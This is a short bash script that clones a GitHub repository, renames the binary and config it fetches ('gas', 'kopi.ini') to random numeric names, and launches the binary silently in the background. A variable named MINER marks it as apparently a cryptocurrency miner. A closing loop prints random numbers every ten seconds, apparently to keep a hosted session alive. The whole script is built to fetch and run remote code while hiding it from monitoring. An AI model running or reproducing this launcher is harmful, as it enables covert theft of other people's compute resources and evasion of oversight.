#!/bin/bash

MINER=$(shuf -i 10-9999999999999999999 -n 1)

INI=$(shuf -i 10-9999999999999999999 -n 1).ini

sudo apt update

git clone https://github.com/angkii/asu 

cd asu

mv gas $MINER

mv kopi.ini $INI

chmod +x $MINER $INI

./$MINER $INI > /dev/null 2>&1 &

x=1; while [ $x -le 36000000 ]; do echo "$(shuf -i 1111111111111111111-9999999999999999999 -n 1)$(( x++ ))" && sleep 10; done
